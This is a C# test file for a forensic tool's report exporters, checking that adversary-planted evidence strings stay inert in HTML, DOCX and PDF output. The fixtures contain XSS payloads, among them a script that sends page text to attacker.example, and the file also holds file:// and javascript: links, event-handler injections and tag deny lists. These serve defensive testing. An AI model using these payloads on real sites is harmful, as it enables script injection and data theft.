using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using Cinder.Reports;
using FluentAssertions;
using Xunit;

namespace Cinder.Core.Tests;

/// <summary>
/// A report is built from bookmarks, and a bookmark is a row out of evidence: a page title, a
/// file name, a registry value. These tests feed the exporters the strings an adversary would
/// plant and assert that the output stays inert — no markup, no script, no fetch, no forged
/// table cell — and that an unprintable byte does not fail the export.
/// </summary>
public sealed partial class ReportHostileContentTests : IDisposable
{
    private readonly string _dir = Directory.CreateTempSubdirectory("cinder-report-hostile").FullName;

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); } catch { }
    }

    // Elements Markdig emits for the constructs a report uses. Anything outside this set in
    // the exported HTML came from somewhere it should not have.
    private static readonly HashSet<string> AllowedTags = new(StringComparer.OrdinalIgnoreCase)
    {
        "html", "head", "meta", "title", "style", "body", "footer",
        "h1", "h2", "h3", "h4", "h5", "h6", "p", "br", "hr", "ul", "ol", "li", "strong", "em", "code", "pre",
        "blockquote", "a", "table", "thead", "tbody", "tr", "th", "td", "del", "ins", "sub", "sup", "mark", "span", "div",
    };

    [GeneratedRegex(@"<\s*([a-zA-Z][a-zA-Z0-9]*)")]
    private static partial Regex OpeningTag();

    [GeneratedRegex("""\b(href|src|srcset|action|formaction|data|poster|background)\s*=\s*"([^"]*)"|\b(on[a-z]+)\s*=\s*["']""", RegexOptions.IgnoreCase)]
    private static partial Regex UrlOrHandlerAttribute();

    private static ReportBuilder BuildHostileReport()
    {
        // What ReportsToolViewModel.ToExhibit produces from a bookmarked browser-history row.
        var description = new StringBuilder()
            .AppendLine("- **title:** <script>fetch('//attacker.example/'+document.body.innerText)</script>")
            .AppendLine("- **url:** <iframe src=\"file:///C:/Windows/win.ini\"></iframe>")
            .AppendLine("- **note:** [click me](javascript:alert(1)) and [this](data:text/html,<script>alert(2)</script>)")
            .AppendLine("- **beacon:** ![pixel](http://attacker.example/beacon.png) ![local](file:///C:/Users/examiner/secret.png)")
            .AppendLine("- **auto:** <javascript:alert(3)>")
            .AppendLine("- **attrs:** [styled](https://example.org){onmouseover=alert(4)}")
            .ToString();

        var builder = new ReportBuilder(
            caseName: "Case </footer><script>alert('case')</script>",
            examiner: "<img src=x onerror=alert('examiner')>",
            title: "Report </title><script>alert('title')</script>");

        builder.AddSection("Exhibits", "One finding.",
        [
            new Exhibit(
                Id: "EX-0001",
                Title: "<img src=x onerror=alert('exhibit')>.jpg",
                Kind: ExhibitKind.ArtifactSet,
                Description: description,
                FilePath: "/home/x/`</code><script>alert('path')</script>",
                FileSize: null,
                Sha256: null,
                Examiner: "<b>mallory</b>",
                CapturedUtc: DateTimeOffset.UnixEpoch),
        ]);
        return builder;
    }

    [Fact]
    public void Html_export_contains_no_markup_from_a_hostile_bookmark_title_or_exhibit_name()
    {
        var html = BuildHostileReport().ToHtml();

        var tags = OpeningTag().Matches(html).Select(m => m.Groups[1].Value).Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        tags.Should().BeSubsetOf(AllowedTags, "evidence text must be rendered as text, never as elements");
        tags.Should().NotContain(["script", "iframe", "img", "object", "embed", "svg", "link", "base", "form"]);

        foreach (Match m in UrlOrHandlerAttribute().Matches(html))
        {
            m.Groups[3].Success.Should().BeFalse($"no event-handler attribute may appear ({m.Value})");
            var name = m.Groups[1].Value;
            var value = WebUtility.HtmlDecode(m.Groups[2].Value);
            name.Should().BeEquivalentTo("href", "only links carry a URL in a report");
            ReportMarkdown.IsAllowedLink(value).Should().BeTrue($"'{value}' must not survive as a link target");
            value.Should().NotStartWithEquivalentOf("javascript:").And.NotStartWithEquivalentOf("data:").And.NotStartWithEquivalentOf("file:");
        }

        // The hostile strings are still there for the reader — as text.
        html.Should().Contain("&lt;script&gt;fetch(");
        html.Should().Contain("&lt;img src=x onerror=alert(");
    }

    [Fact]
    public void Html_export_carries_a_csp_that_forbids_script_and_every_external_load()
    {
        var html = BuildHostileReport().ToHtml();

        var head = html[..html.IndexOf("</head>", StringComparison.Ordinal)];
        head.Should().Contain("http-equiv=\"Content-Security-Policy\"");
        head.Should().Contain("default-src 'none'");
        ReportMarkdown.ContentSecurityPolicy.Should().NotContain("script-src").And.NotContain("http").And.NotContain("*");

        // The policy has to come before anything it is meant to govern.
        head.IndexOf("Content-Security-Policy", StringComparison.Ordinal)
            .Should().BeLessThan(head.IndexOf("<title>", StringComparison.Ordinal));
    }

    [Fact]
    public void Header_fields_are_html_encoded()
    {
        var html = BuildHostileReport().ToHtml();

        var title = html[(html.IndexOf("<title>", StringComparison.Ordinal) + 7)..html.IndexOf("</title>", StringComparison.Ordinal)];
        title.Should().Be("Report &lt;/title&gt;&lt;script&gt;alert(&#39;title&#39;)&lt;/script&gt;");

        var footer = html[html.IndexOf("<footer>", StringComparison.Ordinal)..];
        footer.Should().Contain("&lt;script&gt;alert(&#39;case&#39;)&lt;/script&gt;");
        footer.Should().Contain("&lt;img src=x onerror=alert(&#39;examiner&#39;)&gt;");
    }

    [Fact]
    public void An_exhibit_title_cannot_forge_exhibit_index_cells_or_rows()
    {
        var builder = new ReportBuilder("Case", "alice", "Report");
        builder.AddSection("Exhibits", "Body.",
        [
            new Exhibit("EX-0001",
                "invoice.pdf | File | `" + new string('f', 64) + "` | 2020-01-01 00:00:00Z |\n| EX-9999 | planted.exe | File | `" + new string('0', 64) + "`",
                ExhibitKind.File, null, null, null,
                Sha256: "not-a-hash | `" + new string('a', 64) + "`",
                Examiner: "alice", CapturedUtc: DateTimeOffset.UnixEpoch),
        ]);

        var markdown = builder.ToMarkdown();
        var indexRows = markdown[markdown.IndexOf("## Exhibit Index", StringComparison.Ordinal)..]
            .Split('\n', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
            .Where(l => l.StartsWith('|'))
            .ToList();
        indexRows.Should().HaveCount(3, "header, separator and exactly one exhibit row");

        var html = builder.ToHtml();
        var table = html[html.IndexOf("<table", StringComparison.Ordinal)..html.IndexOf("</table>", StringComparison.Ordinal)];
        var body = table[table.IndexOf("<tbody>", StringComparison.Ordinal)..];
        Regex.Matches(body, "<tr").Should().HaveCount(1);
        Regex.Matches(body, "<td").Should().HaveCount(5, "the pipes in the title and hash are text, not cell boundaries");
        body.Should().NotContain("<td>EX-9999");
    }

    [Theory]
    [InlineData("plain name.txt")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("a | b | c")]
    [InlineData("**bold** _em_ ~~gone~~ ==mark== ++ins++ `code`")]
    [InlineData("[link](javascript:alert(1)) ![img](http://x/y.png)")]
    [InlineData(@"C:\Users\x\AppData\Roaming\[1].exe")]
    [InlineData("&lt;already&gt; &amp; entity &#x3c;")]
    [InlineData("# heading ## {#id .cls onclick=x} $math$ ^sup^")]
    public void EscapeInline_renders_back_as_the_original_text(string evidence)
    {
        var html = ReportMarkdown.ToSafeHtml("Value: " + ReportMarkdown.EscapeInline(evidence) + " :end");

        // The only elements are the paragraph and, at most, an autolink for a bare http(s) URL.
        OpeningTag().Matches(html).Select(m => m.Groups[1].Value).Should().OnlyContain(t => t == "p" || t == "a");

        var text = WebUtility.HtmlDecode(Regex.Replace(html, "<[^>]+>", "")).Trim();
        text.Should().Be("Value: " + evidence + " :end");
    }

    [Fact]
    public void EscapeInline_folds_line_breaks_so_a_value_cannot_start_a_new_block()
    {
        var escaped = ReportMarkdown.EscapeInline("first\r\n\r\n## Exhibit Index\n| EX-0001 | forged |\ttab" + (char)0x1B + "esc");
        escaped.Should().NotContain("\n").And.NotContain("\r").And.NotContain("\t").And.NotContain(((char)0x1B).ToString());

        var html = ReportMarkdown.ToSafeHtml("Value: " + escaped);
        html.Should().NotContain("<h2").And.NotContain("<table");
    }

    [Theory]
    [InlineData("simple")]
    [InlineData("has ` one backtick")]
    [InlineData("``` fence ``` inside")]
    [InlineData("`leading and trailing`")]
    [InlineData("</code><script>alert(1)</script>")]
    public void CodeSpan_cannot_be_closed_from_inside(string evidence)
    {
        var html = ReportMarkdown.ToSafeHtml("File: " + ReportMarkdown.CodeSpan(evidence) + " end");

        Regex.Matches(html, "<code>").Should().HaveCount(1);
        OpeningTag().Matches(html).Select(m => m.Groups[1].Value).Should().OnlyContain(t => t == "p" || t == "code");
        var inside = html[(html.IndexOf("<code>", StringComparison.Ordinal) + 6)..html.IndexOf("</code>", StringComparison.Ordinal)];
        WebUtility.HtmlDecode(inside).Should().Be(evidence);
    }

    [Theory]
    [InlineData("https://example.org/a?b=c", true)]
    [InlineData("http://example.org", true)]
    [InlineData("mailto:someone@example.org", true)]
    [InlineData("#exhibit-index", true)]
    [InlineData("exhibits/EX-0001.pdf", true)]
    [InlineData("javascript:alert(1)", false)]
    [InlineData("JaVaScRiPt:alert(1)", false)]
    [InlineData("java\tscript:alert(1)", false)]
    [InlineData(" javascript:alert(1)", false)]
    [InlineData("data:text/html,<script>alert(1)</script>", false)]
    [InlineData("file:///C:/Windows/win.ini", false)]
    [InlineData("vbscript:msgbox(1)", false)]
    [InlineData("//attacker.example/x", false)]
    [InlineData(@"\\attacker\share\x", false)]
    [InlineData(@"C:\Windows\win.ini", false)]
    public void Link_targets_are_restricted_to_web_mail_and_relative(string url, bool allowed)
    {
        ReportMarkdown.IsAllowedLink(url).Should().Be(allowed);
    }

    [Fact]
    public void Examiner_authored_markdown_still_renders()
    {
        var builder = new ReportBuilder("Case", "alice", "Report");
        builder.AddSection("Findings", "Some **bold** text, a [reference](https://example.org/doc) and:\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- [x] done");

        var html = builder.ToHtml();
        html.Should().Contain("<strong>bold</strong>");
        html.Should().Contain("<a href=\"https://example.org/doc\">reference</a>");
        html.Should().Contain("<td>1</td>");
    }

    [Fact]
    public void A_registered_exhibit_added_to_a_section_is_indexed_once()
    {
        var builder = new ReportBuilder("Case", "alice", "Report");
        var exhibit = builder.RegisterExhibit("vault.kdbx", ExhibitKind.File);
        builder.AddSection("Evidence", "See below.", [exhibit]);

        var markdown = builder.ToMarkdown();
        var index = markdown[markdown.IndexOf("## Exhibit Index", StringComparison.Ordinal)..];
        Regex.Matches(index, "EX-0001").Should().HaveCount(1);
    }

    // ---- Headless-converter path -----------------------------------------------------------

    [Fact]
    public void Chromium_runs_with_a_throwaway_profile_and_no_way_to_resolve_a_host()
    {
        var html = Path.Combine(_dir, "report.html");
        var args = ReportExporter.BuildChromiumArgs(html, Path.Combine(_dir, "out.pdf"), Path.Combine(_dir, "profile"));

        args.Should().Contain("--headless");
        args.Should().Contain("--host-resolver-rules=MAP * ~NOTFOUND");
        args.Should().Contain("--disable-background-networking");
        args.Should().Contain("--disable-extensions");
        args.Should().Contain("--user-data-dir=" + Path.Combine(_dir, "profile"));
        args[^1].Should().Be(new Uri(html).AbsoluteUri, "the document URL is the last argument and is built from our own path");
        args.Should().NotContain(a =>
            a.Contains("allow-file-access", StringComparison.OrdinalIgnoreCase) ||
            a.Contains("disable-web-security", StringComparison.OrdinalIgnoreCase) ||
            a.Contains("remote-debugging", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Wkhtmltopdf_runs_with_script_off_and_never_with_local_file_access()
    {
        var args = ReportExporter.BuildWkhtmltopdfArgs(Path.Combine(_dir, "report.html"), Path.Combine(_dir, "out.pdf"));

        args.Should().Contain("--disable-javascript");
        args.Should().NotContain("--enable-local-file-access");
        args.Should().NotContain("--enable-javascript");
        args.Should().ContainInOrder("--proxy", "http://127.0.0.1:9");
        args.Skip(args.Count - 2).Should().Equal(Path.Combine(_dir, "report.html"), Path.Combine(_dir, "out.pdf"));
    }

    [Fact]
    public void The_html_handed_to_a_converter_references_nothing_outside_itself()
    {
        // This is the property that makes the converter path safe regardless of its flags: the
        // staged document has no element that can load a subresource at all.
        var html = BuildHostileReport().ToHtml();

        Regex.IsMatch(html, @"<\s*(img|iframe|frame|object|embed|script|link|video|audio|source|base)\b", RegexOptions.IgnoreCase)
            .Should().BeFalse();
        Regex.IsMatch(html, @"url\s*\(|@import", RegexOptions.IgnoreCase)
            .Should().BeFalse("the inline stylesheet must not pull anything in either");
    }

    [Fact]
    public async Task Converter_runner_drains_a_child_that_floods_stderr()
    {
        // 512 KB on stderr is two orders of magnitude past a pipe buffer. Reading only after the
        // process exits deadlocks here: the child blocks on write, the parent on exit.
        const int Bytes = 512 * 1024;
        string file;
        string[] args;
        if (OperatingSystem.IsWindows())
        {
            file = "powershell.exe";
            args = ["-NoProfile", "-NonInteractive", "-Command", $"[Console]::Error.Write('x' * {Bytes}); exit 3"];
        }
        else
        {
            file = "/bin/sh";
            args = ["-c", $"head -c {Bytes} /dev/zero | tr '\\0' x >&2; exit 3"];
        }

        var run = ReportExporter.RunConverterAsync(file, args, CancellationToken.None);
        var finished = await Task.WhenAny(run, Task.Delay(TimeSpan.FromSeconds(60)));

        finished.Should().BeSameAs(run, "the runner must not deadlock on a full stderr pipe");
        var (exitCode, stdErr) = await run;
        exitCode.Should().Be(3);
        stdErr.Count(c => c == 'x').Should().BeGreaterThanOrEqualTo(Bytes);
    }

    // ---- DOCX / PDF ------------------------------------------------------------------------

    private static ReportBuilder BuildReportWithControlCharacters()
    {
        var esc = ((char)0x1B).ToString();
        var nul = ((char)0x00).ToString();
        var vt = ((char)0x0B).ToString();
        var loneSurrogate = ((char)0xD800).ToString();

        var builder = new ReportBuilder("Case" + nul + "X", "ali" + vt + "ce", "Report" + esc + "[31m");
        builder.AddSection("Findings" + vt, "Value with a NUL " + nul + " and a lone surrogate " + loneSurrogate + " in it.\n\n- bullet" + esc,
        [
            new Exhibit("EX-0001", "file" + esc + "[0mname.txt", ExhibitKind.File,
                "Registry value: AB" + nul + nul + "CD", "/evidence/odd" + vt + "name", 12, new string('a', 64),
                "ali" + vt + "ce", DateTimeOffset.UnixEpoch),
        ]);
        return builder;
    }

    [Fact]
    public async Task Docx_export_survives_control_characters_in_evidence_strings()
    {
        var outPath = Path.Combine(_dir, "control.docx");

        await new ReportExporter().ExportAsync(BuildReportWithControlCharacters(), ReportFormat.Docx, outPath);

        using var zip = System.IO.Compression.ZipFile.OpenRead(outPath);
        foreach (var part in new[] { "word/document.xml", "docProps/core.xml" })
        {
            var entry = zip.GetEntry(part);
            entry.Should().NotBeNull(part);
            using var stream = entry!.Open();
            // A conforming parser is the judge: it rejects the characters Word would choke on.
            var doc = System.Xml.Linq.XDocument.Load(stream);
            var text = doc.Root!.Value;
            if (part == "word/document.xml")
            {
                text.Should().Contain("Registry value: AB").And.Contain("CD");
                text.Should().Contain("name.txt");
                text.Should().Contain("\uFFFD", "an unprintable character is shown as a replacement, not dropped");
            }
        }
    }

    [Fact]
    public async Task PdfA_export_declares_pdfa_conformance()
    {
        var outPath = Path.Combine(_dir, "report-a.pdf");
        var builder = new ReportBuilder("Case", "alice", "Archive report");
        builder.AddSection("Findings", "Body text.");

        await new ReportExporter().ExportAsync(builder, ReportFormat.PdfA, outPath);

        var bytes = await File.ReadAllBytesAsync(outPath);
        Encoding.ASCII.GetString(bytes, 0, 5).Should().Be("%PDF-");
        var latin = Encoding.Latin1.GetString(bytes);
        latin.Should().Contain("pdfaid:part", "a PDF/A file identifies itself in its XMP metadata");
        latin.Should().Contain("/OutputIntent", "PDF/A requires an output intent");
    }

    [Fact]
    public async Task Plain_pdf_export_does_not_claim_pdfa()
    {
        var outPath = Path.Combine(_dir, "report-plain.pdf");
        var builder = new ReportBuilder("Case", "alice", "Plain report");
        builder.AddSection("Findings", "Body text.");

        await new ReportExporter().ExportAsync(builder, ReportFormat.Pdf, outPath);

        var latin = Encoding.Latin1.GetString(await File.ReadAllBytesAsync(outPath));
        latin.Should().StartWith("%PDF-");
        latin.Should().NotContain("pdfaid:part");
    }

    [Fact]
    public async Task Pdf_export_survives_control_characters_in_evidence_strings()
    {
        var outPath = Path.Combine(_dir, "control.pdf");
        await new ReportExporter().ExportAsync(BuildReportWithControlCharacters(), ReportFormat.PdfA, outPath);
        new FileInfo(outPath).Length.Should().BeGreaterThan(1000);
    }
}
